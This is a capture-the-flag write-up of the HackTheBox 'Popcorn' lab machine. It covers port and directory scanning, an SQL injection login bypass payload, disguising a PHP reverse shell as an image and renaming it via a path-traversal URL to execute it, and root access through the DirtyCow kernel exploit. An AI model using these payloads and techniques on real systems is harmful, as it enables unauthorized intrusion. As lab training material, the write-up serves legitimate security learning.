---
title: "HackTheBox - Popcorn"
author: Nasrallah
description: ""
date: 2023-05-07 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, kernel, sqli]
img_path: /assets/img/hackthebox/machines/popcorn
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [PopCorn](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). 

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.6
Host is up (0.51s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3ec81b15211550ec6e63bcc56b807b38 (DSA)
|_  2048 aa1f7921b842f48a38bdb805ef1a074d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 running SSH and 80 is an Apache http web server, and this is an Ubuntu box.

## Web

Let's check the web page.

![](1.png)

It's a default web page, nothing interesting.

### Feroxbuster

Let's scan for directories and files.

```terminal
$ feroxbuster -w /usr/share/wordlists/dirb/big.txt -o scans/fero.txt -u http://10.10.10.6/ -n -x txt,php                                             1 ⨯ 
                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.7.2                                                                                                             
───────────────────────────┬──────────────────────                                                                                                            
 🎯  Target Url            │ http://10.10.10.6/                                                                                                               
 🚀  Threads               │ 50                                                                                                                               
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt                                                                                                
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.7.2                                                                                                                
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                               
 💾  Output File           │ scans/fero.txt                                                                                                                   
 💲  Extensions            │ [txt, php]                                                                                                                       
 🏁  HTTP methods          │ [GET]                                                                                                                            
 🚫  Do Not Recurse        │ true                                                                                                                             
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                            
───────────────────────────┴──────────────────────                                                                                                            
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                           
──────────────────────────────────────────────────                        
403      GET       10l       30w      287c http://10.10.10.6/.htpasswd                                                                                        
200      GET        4l       25w      177c http://10.10.10.6/
403      GET       10l       30w      291c http://10.10.10.6/.htpasswd.txt
403      GET       10l       30w      291c http://10.10.10.6/.htpasswd.php
403      GET       10l       30w      287c http://10.10.10.6/.htaccess
403      GET       10l       30w      291c http://10.10.10.6/.htaccess.txt
403      GET       10l       30w      291c http://10.10.10.6/.htaccess.php
403      GET       10l       30w      286c http://10.10.10.6/cgi-bin/
200      GET        4l       25w      177c http://10.10.10.6/index
301      GET        9l       28w      309c http://10.10.10.6/rename => http://10.10.10.6/rename/
200      GET      654l     3106w        0c http://10.10.10.6/test
200      GET      652l     3096w        0c http://10.10.10.6/test.php
301      GET        9l       28w      310c http://10.10.10.6/torrent => http://10.10.10.6/torrent/
[####################] - 3m     61407/61407   0s      found:13      errors:4       
[####################] - 3m     61407/61407   322/s   http://10.10.10.6/ 
```

We found two interesting pages `rename` and `torrent`.

Let's check the first one.

![](2.png)

It gave us a syntax we can use to change file names which is :

```url
index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
```

Let's check the `torrent` page.

![](3.png)

This is torrent hoster. I tried going to the `upload` page but it gave me a login page.

![](4.png)

I tried default credentials but no luck with that, then i tried sql injection and logged in successfully with the payload `' or 1=1 -- -`

![](5.png)

# **Foothold**

Now i can access the upload page, i tried uploading files with different format but i get invalid format every time.

On the browse page we see a kali linux file, let's click on it.

![](6.png)

I clicked on `edit this torrent` and got the following:

![](7.png)

We can update the screenshot by uploading images. With that I submitted an image an indeed it got updated.

![](8.png)

Now i remembered the rename function we saw earlier and used it to rename the image i uploaded.

The image is located at `http://10.10.10.6/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png` so i made the following GET request to change the name.

```url
http://10.10.10.6/rename/index.php?filename=../torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png&newfilename=codium.png
```

Now we go to `http://10.10.10.6/rename/codium.png` we can see the image is there.

For a reverse shell, we can upload a php reverse shell with a `png` extension then use the rename function to update the extension back to `php`.

![](9.png)

The name is still the same SHA1 hash, so we can use the same filename and change the newfilename to `shell.php`

```url
http://10.10.10.6/rename/index.php?filename=../torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png&newfilename=shell.php
```

Now we setup a listener and go to `http://10.10.10.6/rename/shell.php`

![](10.png)

We got a shell!

# **Privilege Escalation**

After some manual enumeration that led to nothing useful I checked for linux kernel.

```terminal
www-data@popcorn:/var/www/rename$ uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
```

Searching on google for this kernel we find it's vulnerable to the famous `DirtyCow` exploit.

![](11.png)

The exploit i used is this [one](https://www.exploit-db.com/exploits/40839).

We upload the exploit to the target, compile it and run it.

![](12.png)

Once we run the exploit, it changes the `/etc/passwd` file and adds a new user called `firefart`, we get prompted for a new password for that user and after the exploit finishes it's job we can ssh to the target as `firefart` and have root privileges.

![](13.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).